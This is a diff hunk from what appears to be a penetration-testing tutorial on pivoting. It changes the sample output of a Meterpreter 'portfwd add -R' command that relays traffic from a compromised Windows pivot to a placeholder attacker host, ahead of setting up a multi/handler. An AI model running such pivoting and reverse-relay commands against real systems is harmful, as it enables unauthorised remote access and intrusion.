@@ -123,7 +123,7 @@ We can listen on any remote port and forward its received data to our local port
 Create a reverse port forwarding from remote pivot
 ```shell-session
 meterpreter > portfwd add -R -l 8081 -p 1234 -L <ATTACKER-IP>
-[*] Local TCP relay created: <ATTACKER-IP>:8081 <-> :1234
+[*] Reverse TCP relay created: (remote)[::]:1234 -> (local)<ATTACKER-IP>:8081
 ```
 Now to execute commands on remoter Windows system and receive it on our attacking system:
 1. Configure & start multi/handler: 
